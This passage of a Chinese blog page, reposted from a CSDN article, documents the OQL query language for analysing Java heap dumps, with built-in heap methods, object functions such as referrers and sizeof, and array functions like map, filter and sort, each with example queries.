keyword">file</span></code></pre></li><li><p>显示所有ClassLoader类的名称</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> classof<span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">.</span>name <span class="token keyword">from</span> instanceof java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ClassLoader cl</code></pre></li><li><p>显示由给定id字符串标识的Class的实例</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> o <span class="token keyword">from</span> instanceof <span class="token number">0x741012748</span> o</code></pre><p>请注意，0x741012748是类的ID（在会话中）。通过查看该类页面中显示的id可以找到它。</p></li></ul><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/java/20180824190629307.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/java/20180824190629307.png" alt="img"></a></p><h2 id="OQL内置对象，函数"><a href="#OQL内置对象，函数" class="headerlink" title="OQL内置对象，函数"></a>OQL内置对象，函数</h2><h3 id="堆对象"><a href="#堆对象" class="headerlink" title="堆对象"></a>堆对象</h3><p>该<strong>堆</strong>内置对象支持下列方法：</p><ul><li><p>heap.forEachClass</p><p> - 为每个Java类调用一个回调函数</p><pre class=" language-java"><code class="language-java">heap<span class="token punctuation">.</span><span class="token function">forEachClass</span><span class="token punctuation">(</span>callback<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>heap.forEachObject</p><p> - 为每个Java对象调用回调函数</p><pre><code>heap.forEachObject(callback, clazz, includeSubtypes);</code></pre><pre><code>clazz</code></pre><p>是选择其实例的类。如果未指定，则默认为java.lang.Object。</p><pre><code>includeSubtypes</code></pre><p>是一个布尔标志，指定是否包含子类型实例。该标志的默认值为true。</p></li><li><p>heap.findClass</p><p> - 查找给定名称的Java类</p><pre><code>heap.findClass(className);</code></pre><p>where </p><pre><code>className</code></pre><p>是要查找的类的名称。生成的Class对象具有以下属性：</p><ul><li>name - 类的名称。</li><li>superclass - 超类的类对象（如果是java.lang.Object，则为null）。</li><li>statics - 类的静态字段的名称，值对。</li><li>fields - 字段对象的数组。field对象具有名称，签名属性。</li><li>loader - 加载此类的ClassLoader对象。</li><li>signers - 签署此类的签名者。</li><li>protectionDomain - 此类所属的保护域。</li></ul><p>类对象具有以下方法：</p><ul><li>isSubclassOf - 测试给定的类是否是此类的直接或间接子类。</li><li>isSuperclassOf - 测试给定的Class是否是此类的直接或间接超类。</li><li>subclasses - 返回直接和间接子类的数组。</li><li>superclasses - 返回直接和间接超类的数组。</li></ul></li><li><p>heap.findObject</p><p> - 从给定的对象id中查找对象</p><pre><code>heap.findObject(stringIdOfObject);</code></pre></li><li><p><strong>heap.classes</strong> - 返回所有Java类的枚举</p></li><li><p>heap.objects</p><p> - 返回Java对象的枚举</p><pre><code>heap.objects(clazz, [includeSubtypes], [filter])</code></pre><pre><code>clazz</code></pre><p>是选择其实例的类。如果未指定，则默认为java.lang.Object。</p><pre><code>includeSubtypes</code></pre><p>是一个布尔标志，指定是否包含子类型实例。该标志的默认值为true。此方法接受可选的过滤器表达式以过滤对象的结果集。</p></li><li><p><strong>heap.finalizables</strong> - 返回待完成的Java对象的枚举。</p></li><li><p>heap.livepaths</p><p> - 返回给定对象存活的路径数组。此方法接受可选的第二个参数，它是一个布尔标志。此标志指示是否包含弱引用的路径。默认情况下，不包括具有弱引用的路径。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> heap<span class="token punctuation">.</span>livepaths<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">from</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>String s</code></pre><p>该数组本身的每个元素都是另一个数组。后一个数组包含一个位于路径“引用链”中的对象。</p></li><li><p>heap.roots</p><p> - 返回堆的根的枚举。 </p><p>每个Root对象都具有以下属性：</p><ul><li>id - 此根引用的对象的字符串id</li><li>type - 描述类型的Root（JNI Global，JNI Local，Java Static等）</li><li>description - Root的字符串描述</li><li>referrer - 负责此根或null的Thread Object或Class对象</li></ul></li></ul><p>例子：</p><ul><li><p>访问类java.lang.System的静态字段’props’</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> heap<span class="token punctuation">.</span>findClass<span class="token punctuation">(</span><span class="token string">"java.lang.System"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>statics<span class="token punctuation">.</span>props</code></pre></li><li><p>获取java.lang.String类的字段数</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> heap<span class="token punctuation">.</span>findClass<span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">fields</span><span class="token punctuation">.</span>length</code></pre></li><li><p>找到其对象id被赋予的对象</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> heap<span class="token punctuation">.</span>findObject<span class="token punctuation">(</span><span class="token string">"0xf3800b58"</span><span class="token punctuation">)</span></code></pre></li><li><p>选择所有匹配java.net.*的类</p><pre class=" language-sql"><code class="language-sql"> <span class="token keyword">select</span> filter<span class="token punctuation">(</span>heap<span class="token punctuation">.</span>classes<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"/java.net./.test(it.name)"</span><span class="token punctuation">)</span> </code></pre></li></ul><h3 id="单个对象上的函数"><a href="#单个对象上的函数" class="headerlink" title="单个对象上的函数"></a>单个对象上的函数</h3><ul><li>allocTrace(jobject)</li><li>classof(jobject)</li><li>forEachReferrer(callback, jobject)</li><li>identical(o1, o2)</li><li>objectid(jobject)</li><li>reachables(jobject, excludedFields)</li><li>referrers(jobject)</li><li>referees(jobject)</li><li>refers(jobject)</li><li>root(jobject)</li><li>sizeof(jobject)</li><li>toHtml(obj)</li></ul><h4 id="allocTrace函数"><a href="#allocTrace函数" class="headerlink" title="allocTrace函数"></a><strong>allocTrace函数</strong></h4><p>这将返回给定Java对象的分配站点跟踪（如果可用）。allocTrace返回对象的数组。每个对象具有以下属性：</p><ul><li>className - 其方法在框架中运行的Java类的名称。</li><li>methodName - 运行的Java方法的名称。</li><li>methodSignature - 框架中运行的Java方法的签名。</li><li>sourceFileName - 框架中运行的Java类的源文件的名称。</li><li>lineNumber - 方法中的源行号。</li></ul><h4 id="classof函数"><a href="#classof函数" class="headerlink" title="classof函数"></a><strong>classof函数</strong></h4><p>返回给定Java对象的Class对象。结果对象支持以下属性：</p><ul><li>name - 类的名称。</li><li>superclass - 超类的类对象（如果是java.lang.Object，则为null）。</li><li>静态 - 类的静态字段的名称，值对。</li><li>fields - 字段对象的数组。字段对象具有名称，签名属性。</li><li>loader - 加载此类的ClassLoader对象。</li><li>签名者 - 签署此类的签名者。</li><li>protectionDomain - 此类所属的保护域。</li></ul><p>类对象具有以下方法：</p><ul><li>isSubclassOf - 测试给定的类是否是此类的直接或间接子类。</li><li>isSuperclassOf - 测试给定的Class是否是此类的直接或间接超类。</li><li>subclasses - 返回直接和间接子类的数组。</li><li>superclasses - 返回直接和间接超类的数组。</li></ul><p>例子：</p><ul><li><p>显示每个Reference类型对象的类名</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> classof<span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">.</span>name <span class="token keyword">from</span> instanceof java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ref<span class="token punctuation">.</span>Reference o</code></pre></li><li><p>显示java.io.InputStream的所有子类</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> heap<span class="token punctuation">.</span>findClass<span class="token punctuation">(</span><span class="token string">"java.io.InputStream"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>subclasses<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li><li><p>显示java.io.BufferedInputStream的所有超类</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> heap<span class="token punctuation">.</span>findClass<span class="token punctuation">(</span><span class="token string">"java.io.BufferedInputStream"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>superclasses<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li></ul><h4 id="forEachReferrer函数"><a href="#forEachReferrer函数" class="headerlink" title="forEachReferrer函数"></a><strong>forEachReferrer函数</strong></h4><p>为给定Java对象的每个引用者调用一个回调函数。</p><h4 id="identical函数"><a href="#identical函数" class="headerlink" title="identical函数"></a><strong>identical函数</strong></h4><p>返回两个给定的Java对象是否相同。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> identical<span class="token punctuation">(</span>heap<span class="token punctuation">.</span>findClass<span class="token punctuation">(</span><span class="token string">"Foo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>statics<span class="token punctuation">.</span>bar<span class="token punctuation">,</span> heap<span class="token punctuation">.</span>findClass<span class="token punctuation">(</span><span class="token string">"AnotherClass"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>statics<span class="token punctuation">.</span>bar<span class="token punctuation">)</span></code></pre><h4 id="objectid函数"><a href="#objectid函数" class="headerlink" title="objectid函数"></a><strong>objectid函数</strong></h4><p>返回给定Java对象的String id。此id可以传递给 heap.findObject，也可以用于比较对象以进行标识。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> objectid<span class="token punctuation">(</span>o<span class="token punctuation">)</span> <span class="token keyword">from</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Object o</code></pre><h4 id="reachables函数"><a href="#reachables函数" class="headerlink" title="reachables函数"></a><strong>reachables函数</strong></h4><p>返回从给定Java对象传递引用的Java对象数组。（可选）接受第二个参数，该参数是逗号分隔的字段名称，以从可达性计算中排除。字段以class_name.field_name模式编写。</p><p>例子：</p><ul><li><p>从每个Properties实例打印所有可到达的对象。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> reachables<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token keyword">from</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties p</code></pre></li><li><p>打印每个java.net.URL中的所有可访问内容，但省略可通过指定字段访问的对象。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> reachables<span class="token punctuation">(</span>u<span class="token punctuation">,</span> <span class="token string">'java.net.URL.handler'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL u</code></pre></li></ul><h4 id="referrers函数"><a href="#referrers函数" class="headerlink" title="referrers函数"></a><strong>referrers函数</strong></h4><p>返回引用了给定Java对象的所有对象</p><p>例子：</p><ul><li><p>查询每个java.lang.Object实例被引用的次数</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span>referrers<span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Object o</code></pre></li><li><p>查询那些对象引用了java.io.File实例对象</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> referrers<span class="token punctuation">(</span><span class="token number">f</span><span class="token punctuation">)</span> <span class="token keyword">from</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span><span class="token keyword">File</span> <span class="token number">f</span></code></pre></li><li><p>查询被引用次数超过2的URL对象</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> u <span class="token keyword">from</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL u <span class="token keyword">where</span> <span class="token function">count</span><span class="token punctuation">(</span>referrers<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2</span></code></pre></li></ul><h4 id="referees函数"><a href="#referees函数" class="headerlink" title="referees函数"></a><strong>referees函数</strong></h4><p>返回给定Java对象直接引用的Java对象数组。</p><p>示例：打印java.io.File类的所有静态引用字段<code></code></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> referees<span class="token punctuation">(</span>heap<span class="token punctuation">.</span>findClass<span class="token punctuation">(</span><span class="token string">"java.io.File"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="refers函数"><a href="#refers函数" class="headerlink" title="refers函数"></a><strong>refers函数</strong></h4><p>返回第一个Java对象是否引用第二个Java对象。</p><h4 id="root函数"><a href="#root函数" class="headerlink" title="root函数"></a><strong>root函数</strong></h4><p>如果给定对象是根对象集的成员，则此函数返回描述其原因的描述性根对象。如果给定的对象不是root，则此函数返回null。</p><p><strong>sizeof函数</strong></p><p>以字节为单位返回给定Java对象的大小示例：</p><pre class=" language-sql"><code class="language-sql"> <span class="token keyword">select</span> sizeof<span class="token punctuation">(</span>o<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">[</span>I o</code></pre><h4 id="toHtml函数"><a href="#toHtml函数" class="headerlink" title="toHtml函数"></a>toHtml函数</h4><p>返回给定Java对象的HTML字符串。请注意，对于select表达式选择的对象，会自动调用此方法。但是，打印更复杂的输出可能很有用。示例：以粗体字体重量打印超链接<code></code></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">"&lt;b>"</span> <span class="token operator">+</span> toHtml<span class="token punctuation">(</span>o<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;/b>"</span> <span class="token keyword">from</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Object o</code></pre><h3 id="选择多个值"><a href="#选择多个值" class="headerlink" title="选择多个值"></a>选择多个值</h3><p>可以使用JavaScript对象文字或数组选择多个值。</p><p>示例：显示每个线程对象的名称和线程<code></code></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> { name: t<span class="token punctuation">.</span>name? t<span class="token punctuation">.</span>name<span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span> : <span class="token string">"null"</span><span class="token punctuation">,</span> thread: t } <span class="token keyword">from</span> instanceof java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Thread t</code></pre><h3 id="数组-迭代器-枚举操作函数"><a href="#数组-迭代器-枚举操作函数" class="headerlink" title="数组/迭代器/枚举操作函数"></a>数组/迭代器/枚举操作函数</h3><p>这些函数接受数组/迭代器/枚举和表达式字符串[或回调函数]作为输入。这些函数迭代数组/迭代器/枚举，并在每个元素上应用表达式（或函数）。请注意，JavaScript对象是关联数组。因此，这些函数也可以与任意JavaScript对象一起使用。</p><h4 id="concat函数"><a href="#concat函数" class="headerlink" title="concat函数"></a><strong>concat函数</strong></h4><p>连接两个数组或枚举（即返回复合枚举）。</p><h4 id="contains函数"><a href="#contains函数" class="headerlink" title="contains函数"></a><strong>contains函数</strong></h4><p>返回给定的数组/枚举是否包含代码中指定的给定布尔表达式的元素。评估的代码可以引用以下内置变量。</p><ul><li>it - &gt;目前访问过的元素</li><li>index - &gt;当前元素的索引</li><li>array - &gt;正在迭代的数组/枚举</li></ul><p>示例：选择某些静态字段引用某些类的所有Properties对象。<code></code></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> p <span class="token keyword">from</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties p<span class="token keyword">where</span> <span class="token keyword">contains</span><span class="token punctuation">(</span>referrers<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"classof(it).name == 'java.lang.Class'"</span><span class="token punctuation">)</span></code></pre><ul><li>concat(array1/enumeration1, array2/enumeration2)</li><li>contains(array/enumeration, expression)</li><li>count(array/enumeration, expression)</li><li>filter(array/enumeration, expression)</li><li>length(array/enumeration)</li><li>map(array/enumeration, expression)</li><li>max(array/enumeration, [expression])</li><li>min(array/enumeration, [expression])</li><li>sort(array/enumeration, [expression])</li><li>sum(array/enumeration, [expression])</li><li>toArray(array/enumeration)</li><li>unique(array/enumeration, [expression])</li></ul><h4 id="count函数"><a href="#count函数" class="headerlink" title="count函数"></a><strong>count函数</strong></h4><p>count函数返回满足给定布尔表达式的输入数组/枚举的元素数。布尔表达式代码可以引用以下内置变量。</p><ul><li>it - &gt;目前访问过的元素</li><li>index - &gt;当前元素的索引</li><li>array - &gt;正在迭代的数组/枚举</li></ul><p>示例：查询匹配特定名称模式的类的数量<code></code></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span>heap<span class="token punctuation">.</span>classes<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"/java.io./.test(it.name)"</span><span class="token punctuation">)</span></code></pre><h4 id="filter函数"><a href="#filter函数" class="headerlink" title="filter函数"></a><strong>filter函数</strong></h4><p>filter函数返回一个数组/枚举，其中包含满足给定布尔表达式的输入数组/枚举的元素。布尔表达式代码可以引用以下内置变量。</p><ul><li>it - &gt;目前访问过的元素</li><li>index - &gt;当前元素的索引</li><li>array - &gt;正在迭代的数组/枚举</li><li>result - &gt; result array / enumeration</li></ul><p>例子：</p><ul><li><p>显示所有具有匹配java.io. * 的类</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> filter<span class="token punctuation">(</span>heap<span class="token punctuation">.</span>classes<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"/java.io./.test(it.name)"</span><span class="token punctuation">)</span></code></pre></li><li><p>显示引用者不是来自java.net包的URL对象的所有引用</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> filter<span class="token punctuation">(</span>referrers<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"! /java.net./.test(classof(it).name)"</span><span class="token punctuation">)</span><span class="token keyword">from</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL u</code></pre></li></ul><h4 id="length函数"><a href="#length函数" class="headerlink" title="length函数"></a><strong>length函数</strong></h4><p>length函数返回数组/枚举的元素数。</p><h4 id="map函数"><a href="#map函数" class="headerlink" title="map函数"></a><strong>map函数</strong></h4><p>通过评估每个元素上的给定代码来转换给定的数组/枚举。评估的代码可以引用以下内置变量。</p><ul><li>it - &gt;目前访问过的元素</li><li>index - &gt;当前元素的索引</li><li>array - &gt;正在迭代的数组/枚举</li><li>result - &gt; result array / enumeration</li></ul><p>map函数返回通过在输入数组/枚举的每个元素上重复调用代码而创建的值的数组/枚举。</p><p>示例：显示具有名称和值的java.io.File的所有静态字段</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> map<span class="token punctuation">(</span>heap<span class="token punctuation">.</span>findClass<span class="token punctuation">(</span><span class="token string">"java.io.File"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>statics<span class="token punctuation">,</span> <span class="token string">"index + '=' + toHtml(it)"</span><span class="token punctuation">)</span></code></pre><h4 id="max函数"><a href="#max函数" class="headerlink" title="max函数"></a><strong>max函数</strong></h4><p>返回给定数组/枚举的最大元素。（可选）接受代码表达式以比较数组的元素。默认情况下使用数字比较。比较表达式可以使用以下内置变量：</p><ul><li>lhs - &gt;左侧元素进行比较</li><li>rhs - &gt;右侧元素进行比较</li></ul><p>例子：</p><ul><li><p>找到任何String实例的最大长度</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">max</span><span class="token punctuation">(</span>map<span class="token punctuation">(</span>heap<span class="token punctuation">.</span>objects<span class="token punctuation">(</span><span class="token string">'java.lang.String'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'it.value.length'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li><li><p>查找具有最大长度的字符串实例</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">max</span><span class="token punctuation">(</span>heap<span class="token punctuation">.</span>objects<span class="token punctuation">(</span><span class="token string">'java.lang.String'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'lhs.value.length > rhs.value.length'</span><span class="token punctuation">)</span></code></pre></li></ul><h4 id="min函数"><a href="#min函数" class="headerlink" title="min函数"></a><strong>min函数</strong></h4><p>返回给定数组/枚举的最小元素。（可选）接受代码表达式以比较数组的元素。默认情况下使用数字比较。比较表达式可以使用以下内置变量：</p><ul><li>lhs - &gt;左侧元素进行比较</li><li>rhs - &gt;右侧元素进行比较</li></ul><p>例子：</p><ul><li><p>找到任何Vector实例的最小大小</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">min</span><span class="token punctuation">(</span>map<span class="token punctuation">(</span>heap<span class="token punctuation">.</span>objects<span class="token punctuation">(</span><span class="token string">'java.util.Vector'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'it.elementData.length'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li><li><p>找到具有最大长度的Vector实例</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">min</span><span class="token punctuation">(</span>heap<span class="token punctuation">.</span>objects<span class="token punctuation">(</span><span class="token string">'java.util.Vector'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'lhs.elementData.length &lt; rhs.elementData.length'</span><span class="token punctuation">)</span></code></pre></li></ul><h4 id="sort函数"><a href="#sort函数" class="headerlink" title="sort函数"></a><strong>sort函数</strong></h4><p>给出数组/枚举的排序。（可选）接受代码表达式以比较数组的元素。默认情况下使用数字比较。比较表达式可以使用以下内置变量：</p><ul><li>lhs - &gt;左侧元素进行比较</li><li>rhs - &gt;右侧元素进行比较</li></ul><p>例子：</p><ul><li><p>按大小顺序打印所有char []对象。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> sort<span class="token punctuation">(</span>heap<span class="token punctuation">.</span>objects<span class="token punctuation">(</span><span class="token string">'[C'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'sizeof(lhs) - sizeof(rhs)'</span><span class="token punctuation">)</span></code></pre></li></ul><ul><li><p>按大小顺序打印所有char []对象，同时也打印大小。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> map<span class="token punctuation">(</span>sort<span class="token punctuation">(</span>heap<span class="token punctuation">.</span>objects<span class="token punctuation">(</span><span class="token string">'[C'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'sizeof(lhs) - sizeof(rhs)'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'{ size: sizeof(it), obj: it }'</span><span class="token punctuation">)</span></code></pre></li></ul><h4 id="sum函数"><a href="#sum函数" class="headerlink" title="sum函数"></a><strong>sum函数</strong></h4><p>此函数返回给定输入数组或枚举的所有元素的总和。（可选）接受表达式作为第二个参数。这用于在对输入元素求和之前映射输入元素。</p><p>示例：返回每个Properties对象中可到达对象的大小总和<code></code></p><pre class=" language-sql"><code class="language-sql">    <span class="token keyword">select</span> <span class="token function">sum</span><span class="token punctuation">(</span>map<span class="token punctuation">(</span>reachables<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'sizeof(it)'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">from</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties p    <span class="token comment" spellcheck="true">// or omit the map as in ...</span>    <span class="token keyword">select</span> <span class="token function">sum</span><span class="token punctuation">(</span>reachables<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'sizeof(it)'</span><span class="token punctuation">)</span>     <span class="token keyword">from</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties p</code></pre><h4 id="toArray函数"><a href="#toArray函数" class="headerlink" title="toArray函数"></a><strong>toArray函数</strong></h4><p>此函数返回一个包含输入数组/枚举元素的数组。</p><h4 id="unique函数"><a href="#unique函数" class="headerlink" title="unique函数"></a><strong>unique函数</strong></h4><p>此函数返回包含给定输入数组/枚举的唯一元素的数组/枚举</p><p>示例：选择从字符串引用的唯一char []实例。请注意，多个String实例可以共享内容的相同char []。<code></code></p><pre class=" language-sql"><code class="language-sql">   <span class="token comment" spellcheck="true">// number of unique char[] instances referenced from any String</span>   <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token keyword">unique</span><span class="token punctuation">(</span>map<span class="token punctuation">(</span>heap<span class="token punctuation">.</span>objects<span class="token punctuation">(</span><span class="token string">'java.lang.String'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'it.value'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// total number of Strings</span>   <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span>heap<span class="token punctuation">.</span>objects<span class="token punctuation">(</span><span class="token string">'java.lang.String'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="更复杂的例子"><a href="#更复杂的例子" class="headerlink" title="更复杂的例子"></a>更复杂的例子</h3><p>打印每个类加载器的直方图和由它加载的类的数量</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> map<span class="token punctuation">(</span>sort<span class="token punctuation">(</span>map<span class="token punctuation">(</span>heap<span class="token punctuation">.</span>objects<span class="token punctuation">(</span><span class="token string">'java.lang.ClassLoader'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'{ loader: it, count: it.classes.elementCount }'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'lhs.count &lt; rhs.count'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'toHtml(it) + "&lt;br>"'</span><span class="token punctuation">)</span></code></pre><p>上面的查询解释：<strong>java.lang.ClassLoader</strong>有一个名为<strong>java.util.Vector</strong>类型的<strong>类</strong>的私有字段，Vector有一个名为<strong>elementCount</strong>的私有字段，它是Vector中元素的数量。我们使用JavaScript对象文字和地图功能选择多个值（加载器，计数）。我们使用带有比较表达式的sort函数对count（即加载的类数）进行排序。</p><p>查询每个类加载器实例的父子链<code></code></p><pre class=" language-sql"><code class="language-sql">   <span class="token keyword">select</span> map<span class="token punctuation">(</span>heap<span class="token punctuation">.</span>objects<span class="token punctuation">(</span><span class="token string">'java.lang.ClassLoader'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token keyword">function</span> <span class="token punctuation">(</span>it<span class="token punctuation">)</span> {         var res <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>         <span class="token keyword">while</span> <span class="token punctuation">(</span>it <span class="token operator">!=</span> <span class="token boolean">null</span><span class="token punctuation">)</span> {            res <span class="token operator">+</span><span class="token operator">=</span> toHtml<span class="token punctuation">(</span>it<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"->"</span><span class="token punctuation">;</span>            it <span class="token operator">=</span> it<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>         }         res <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">"null"</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> res <span class="token operator">+</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>      }<span class="token punctuation">)</span></code></pre><p>请注意，我们使用<strong>java.lang.ClassLoader</strong>类的<strong>父</strong>字段并使用回调函数遍历parent为null以映射调用。</p><p>查询所有系统属性的值</p><pre class=" language-sql"><code class="language-sql">  <span class="token keyword">select</span> map<span class="token punctuation">(</span>filter<span class="token punctuation">(</span>heap<span class="token punctuation">.</span>findClass<span class="token punctuation">(</span><span class="token string">'java.lang.System'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>statics<span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token keyword">table</span><span class="token punctuation">,</span> <span class="token string">'it != null'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>             <span class="token keyword">function</span> <span class="token punctuation">(</span>it<span class="token punctuation">)</span> {                var res <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>it <span class="token operator">!=</span> <span class="token boolean">null</span><span class="token punctuation">)</span> {                    res <span class="token operator">+</span><span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token keyword">key</span><span class="token punctuation">.</span><span class="token keyword">value</span><span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'='</span> <span class="token operator">+</span>                           it<span class="token punctuation">.</span><span class="token keyword">value</span><span class="token punctuation">.</span><span class="token keyword">value</span><span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>                    it <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token keyword">next</span><span class="token punctuation">;</span>                }                <span class="token keyword">return</span> res<span class="token punctuation">;</span>            }<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>以上查询使用以下事实：</p><ul><li>java.lang.System具有类型为java.util.Properties的名称为’props’的静态字段。</li><li>java.util.Properties的字段为’table’，类型为java.util.Hashtable $ Entry（此字段继承自java.util.Hashtable）。这是hashtable桶数组。</li><li>java.util.Hashtable $ Entry包含’key’，’value’和’next’字段。每个条目指向同一哈希表桶中的下一个条目（或null）。</li><li>java.lang.String类具有char []类型的’value’字段。</li></ul><p><strong>请注意，此查询（以及许多其他查询）可能不稳定 - 因为Java平台类的私有字段可能会被修改/删除而不会发出任何通知！（实施细节）</strong>。但是，在用户类上使用此类查询可能是安全的 - 假设用户可以控制类。</p><p>本文转自：<a href="https://blog.csdn.net/pange1991/article/details/82023771" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
